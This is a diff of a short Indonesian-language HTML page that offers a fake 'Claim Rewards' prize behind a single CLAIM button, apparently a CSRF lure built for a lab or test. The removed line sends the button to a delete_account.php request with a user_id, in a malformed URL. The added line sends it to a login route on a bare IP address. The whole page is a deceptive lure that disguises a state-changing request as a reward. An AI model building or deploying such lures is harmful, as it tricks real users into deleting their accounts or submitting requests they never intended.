@@ -10,7 +10,7 @@
     <div class="card text-center shadow p-4" style="max-width: 400px;">
         <h5 class="card-title">🎉 Claim Rewards Anda!</h5>
         <p class="card-text">Dapatkan hadiah Anda dengan mengklik tombol di bawah ini:</p>
-        <a href="https://example.com/delete_account.php?user_id=31=http://82.197.68.85:38259/api/routes/api.php?route=login" class="btn btn-primary mt-3">CLAIM</a>
+        <a href="http://82.197.68.85:38259/api/routes/api.php?route=login" class="btn btn-primary mt-3">CLAIM</a>
     </div>
 </body>
 </html>
